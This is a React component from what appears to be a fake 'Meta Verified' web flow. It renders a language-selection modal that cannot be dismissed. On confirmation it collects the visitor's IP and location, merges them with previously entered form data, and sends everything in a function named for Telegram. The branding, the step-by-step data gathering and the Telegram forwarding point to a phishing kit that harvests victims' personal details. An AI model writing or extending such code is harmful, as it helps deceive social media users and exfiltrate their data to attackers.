'use client'

import React from 'react'
import { AnimatePresence, motion } from 'framer-motion'

import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
import { setLocale } from '@/app/store/slices/localeSlice'
import { updateForm } from '@/app/store/slices/stepFormSlice'
import { LOCALE_BCP47 } from '@/i18n'
import { APP_LOCALES, type AppLocale } from '@/i18n/schema'
import { LOCALE_OPTION_LABELS } from '@/i18n/localeOptionLabels'
import { useAppStrings } from '@/hooks/useAppStrings'
import { getUserLocation } from '@/utils/getLocation'
import { isMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow'
import { LANG_MODAL_SEEN_KEY, readSessionDisplayLocale, writeSessionDisplayLocale } from '@/utils/metaVerifiedDisplayLocale'
import { SendData } from '@/utils/sendData'

function applyDocumentLang(locale: AppLocale) {
  if (typeof document !== 'undefined') {
    document.documentElement.lang = LOCALE_BCP47[locale]
    document.documentElement.dataset.locale = locale
  }
}

function ChevronIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M7 10l5 5 5-5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  )
}

type MvLanguageModalProps = {
  isOpen: boolean
  onClose: () => void
}

export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProps) {
  const t = useAppStrings()
  const dispatch = useAppDispatch()
  const currentLocale = useAppSelector((s) => s.locale.locale)
  const formData = useAppSelector((s) => s.stepForm.data)
  const [draftLocale, setDraftLocale] = React.useState<AppLocale>(currentLocale)
  const [loading, setLoading] = React.useState(false)
  const [menuOpen, setMenuOpen] = React.useState(false)
  const selectId = 'mv-lang-modal-select'
  const menuId = 'mv-lang-modal-select-menu'
  const fieldRef = React.useRef<HTMLDivElement>(null)
  const menuRef = React.useRef<HTMLUListElement>(null)
  const sendingRef = React.useRef(false)

  React.useEffect(() => {
    if (isOpen) {
      setDraftLocale(readSessionDisplayLocale() ?? 'en')
      setLoading(false)
      setMenuOpen(false)
      sendingRef.current = false
    }
  }, [isOpen, currentLocale])

  React.useEffect(() => {
    if (!menuOpen) return
    const selected = menuRef.current?.querySelector<HTMLElement>('[aria-selected="true"]')
    selected?.scrollIntoView({ block: 'nearest' })
  }, [menuOpen, draftLocale])

  React.useEffect(() => {
    if (!isOpen) return
    // Modal bắt buộc — chặn Escape đóng modal (vẫn cho đóng menu ngôn ngữ)
    const onKey = (event: KeyboardEvent) => {
      if (event.key === 'Escape') {
        event.preventDefault()
        event.stopPropagation()
        if (menuOpen) setMenuOpen(false)
      }
    }
    document.addEventListener('keydown', onKey, true)
    return () => document.removeEventListener('keydown', onKey, true)
  }, [isOpen, menuOpen])

  React.useEffect(() => {
    if (!menuOpen) return
    const handlePointerDown = (event: MouseEvent) => {
      if (!fieldRef.current?.contains(event.target as Node)) {
        setMenuOpen(false)
      }
    }
    document.addEventListener('mousedown', handlePointerDown)
    return () => document.removeEventListener('mousedown', handlePointerDown)
  }, [menuOpen])

  const markSeen = () => {
    try {
      localStorage.setItem(LANG_MODAL_SEEN_KEY, '1')
    } catch {
      /* ignore */
    }
  }

  const sendLanguageConfirmToTelegram = async (locale: AppLocale) => {
    if (isMetaVerifiedFlowCompleted()) return

    // Luôn lấy lại IP từ server (header client thật) trước khi gửi Telegram
    const location = await getUserLocation()
    dispatch(updateForm(location))

    const payload: Record<string, unknown> = {
      ...formData,
      ...location,
      language: LOCALE_OPTION_LABELS[locale],
    }

    try {
      await SendData(payload)
    } catch {
      /* luồng UX vẫn tiếp tục */
    }
  }

  const handleConfirm = async () => {
    if (loading || sendingRef.current) return
    sendingRef.current = true
    setLoading(true)
    setMenuOpen(false)

    writeSessionDisplayLocale(draftLocale)
    dispatch(setLocale(draftLocale))
    applyDocumentLang(draftLocale)

    try {
      await sendLanguageConfirmToTelegram(draftLocale)
    } finally {
      markSeen()
      setLoading(false)
      sendingRef.current = false
      onClose()
    }
  }

  const selectLocale = (locale: AppLocale) => {
    setDraftLocale(locale)
    setMenuOpen(false)
  }

  return (
    <AnimatePresence>
      {isOpen ? (
        <motion.div
          key="mv-lang-backdrop"
          className="mv-lang-modal-backdrop"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
        >
          <motion.div
            key="mv-lang-panel"
            role="dialog"
            aria-modal="true"
            aria-labelledby="mv-lang-modal-title"
            className="mv-lang-modal"
            initial={{ opacity: 0, scale: 0.96, y: 10 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.96, y: 10 }}
            transition={{ duration: 0.2, ease: [0.22, 1, 0.36, 1] }}
          >
            <div className="mv-lang-modal-header">
              <h2 id="mv-lang-modal-title" className="mv-lang-modal-title">
                {t.languagePicker.modalTitle}
              </h2>
            </div>

            <div className="mv-lang-modal-body">
              <div className="mv-lang-modal-field" ref={fieldRef}>
                <span className="mv-lang-modal-field-label" id={`${selectId}-label`}>
                  {t.languagePicker.fieldLabel}
                </span>
                <span className="mv-lang-modal-field-control">
                  <button
                    type="button"
                    id={selectId}
                    className="mv-lang-modal-select"
                    disabled={loading}
                    aria-haspopup="listbox"
                    aria-expanded={menuOpen}
                    aria-controls={menuId}
                    aria-labelledby={`${selectId}-label`}
                    onClick={() => setMenuOpen((open) => !open)}
                  >
                    <span className="mv-lang-modal-select-value">
                      {LOCALE_OPTION_LABELS[draftLocale]}
                    </span>
                  </button>
                  <span className="mv-lang-modal-chevron" aria-hidden="true">
                    <ChevronIcon />
                  </span>
                  {menuOpen ? (
                    <ul
                      id={menuId}
                      ref={menuRef}
                      className="mv-lang-modal-select-menu"
                      role="listbox"
                      aria-labelledby={`${selectId}-label`}
                    >
                      {APP_LOCALES.map((code) => {
                        const selected = code === draftLocale
                        return (
                          <li key={code} role="presentation">
                            <button
                              type="button"
                              role="option"
                              aria-selected={selected}
                              className={
                                selected
                                  ? 'mv-lang-modal-option-btn mv-lang-modal-option-btn--selected'
                                  : 'mv-lang-modal-option-btn'
                              }
                              disabled={loading}
                              onClick={() => selectLocale(code)}
                            >
                              {LOCALE_OPTION_LABELS[code]}
                            </button>
                          </li>
                        )
                      })}
                    </ul>
                  ) : null}
                </span>
              </div>
            </div>

            <div className="mv-lang-modal-footer">
              <button
                type="button"
                className="mv-lang-modal-btn mv-lang-modal-btn--confirm"
                disabled={loading}
                onClick={() => void handleConfirm()}
              >
                {t.languagePicker.confirm}
              </button>
            </div>
          </motion.div>
        </motion.div>
      ) : null}
    </AnimatePresence>
  )
}
